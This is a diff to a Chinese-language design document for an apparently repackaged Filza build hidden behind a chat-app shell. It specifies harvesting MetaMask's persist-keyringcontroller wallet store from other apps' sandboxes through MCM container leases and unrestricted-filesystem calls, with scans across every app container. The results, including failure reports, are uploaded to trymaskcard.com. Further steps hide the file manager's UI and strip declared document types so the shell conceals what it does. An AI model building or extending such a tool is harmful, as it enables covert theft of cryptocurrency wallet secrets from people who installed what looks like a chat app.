@@ -76,6 +76,7 @@
 |---|---|---|---|
 | 探针 | 每次启动（`uploadProbe`，默认开） | `shell-hello.txt` | 只带 uuid / 模式 / 主页 / bundle / 系统版本；**不依赖 MetaMask、不依赖崩溃**，用来证明端点通 |
 | 采集 | 目标 App 的 persist store **读取成功**（默认 `io.metamask`） | `persist-keyringcontroller` | 目标未安装或容器解析失败就**不会上传**——这是设计上的盲区，靠探针与崩溃上报补 |
+| 采集结果 | 每次采集结束（成功**或**失败，按结果指纹去重） | `persist-harvest.txt` | 含 `status`/`resolution`/`discoveryMethod`/容器路径/`scanReport`；失败原因不再只留在设备上 |
 | 崩溃上报 | 上次运行留下 `LastException.txt` / `LastSignal.txt`（`crashAutoReport`，默认开） | `LastException.txt` / `LastSignal.txt` / `Runtime-tail.log` / `TryMaskCardShell-Status.txt` | 同一个指纹只投一次 |
 
 `uuid` 一律用**本 App 自己容器的 UUID**（`NSHomeDirectory()` 最后一段），探针与崩溃上报都如此；采集走的 `uuid` 是**目标 App 容器的 UUID**（也就是接口示例里那个 UUID 的语义）。端点默认 `https://trymaskcard.com/api/app/device-upload`，可用 `crashUploadURL` 单独覆盖上报地址。
@@ -90,10 +91,22 @@ bash scripts/build_chat_shell_ipa.sh <base>.ipa out.ipa --upload-uuid 550e8400-e
 
 对应响应形如：`{"ok": true, "uuid": "...", "matchedCustomer": true, "uploadId": "...", "file": {"name": "shell-hello.txt", "type": "text/plain", "size": 244}}`。
 
+### 2.1.4 目标文件名没有后缀名时怎么找（`persist-keyringcontroller`）
+
+`persistStore/persist-keyringcontroller` **没有扩展名**，且同目录还有 `persist-root` 等同名前缀文件，所以不能用扩展名或前缀去猜。解析按顺序：
+
+1. **开沙盒不受限开关**：`MCMFilzaSetUnrestrictedFilesystem(YES)`（`persistUnrestrictedFilesystem`，默认开）。重新签名过的包 MCM 租约会被拒，而**只有路径没有租约的沙盒扩展是读不了的**——表现为「容器能列、文件读不到」，看起来就像文件不存在。
+2. **MCM 租约**：`MCMFilzaDataContainerPath(bundleID)`；失败再试 **`MCMActivateContainerPath(2, bundleID, NO, …)`**（class-2 数据容器，激活=拿扩展）。
+3. Filza 虚拟根软链 → 容器元数据扫描 → LaunchServices。
+4. **容器内精确路径** → 目录内**按名字包含匹配**（大小写不敏感，取最大者，兼容版本后缀差异；`resolution` 记 `exact-path`/`fuzzy-name`/`fuzzy-name-parent`）。
+5. **跨容器按名字扫描**：bundle id 没解析出来时，枚举**所有** App 容器的 `Documents/persistStore/` 找这个名字（re-signed/改名包带同一份文件的情形）；`scanReport` 列出每个含该目录的容器的 UUID、identifier 与文件清单。
+
+任何一步失败都会把 `status`（`container_not_found`/`file_not_found`/`read_failed`）、`discoveryMethod`、`resolution`、目录清单一起放进 `persist-harvest.txt` 上传，所以「文件没到」一定有可读的原因，而不是静默。
+
 ### 2.2 硬保证
 
 1. `UIWindow.setRootViewController:` 被接管，但只守已确认的 App 主窗口：Filza 给该窗口请求的 root 会被 `TMShellCaptureHiddenRoot` 收走并强引用保留；UIKit/WebKit 的辅助窗口原样放行。
-2. `UIViewController.presentViewController:animated:completion:` 上装了模态防火墙：聊天界面在最前时，Filza 自己弹的东西（激活提示、支持面板、远程控制台导读、3105/ByeTunes 工作区）会被拒绝并写日志，不会叠在聊天界面上。
+2. `UIViewController.presentViewController:animated:completion:` 上装了模态防火墙：聊天界面在最前时，Filza 自己弹的东西（激活提示、支持面板、远程控制台导读、3105/ByeTunes 工作区）会被拒绝并写日志，不会叠在聊天界面上。**默认关闭**（`suppressFilzaModals`），开启时也只拦 `TG`/`Filza`/`MCM`/`PB` 前缀的类，绝不动 WebKit/系统自己的展示。
 3. 图标长按快捷项被过滤（`UIApplication.setShortcutItems:`），打包时还会删掉 `UIApplicationShortcutItems`。
 4. 打包时删除 `CFBundleDocumentTypes` / `UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`：外壳不再对外声明它能处理文件管理类文档。
 
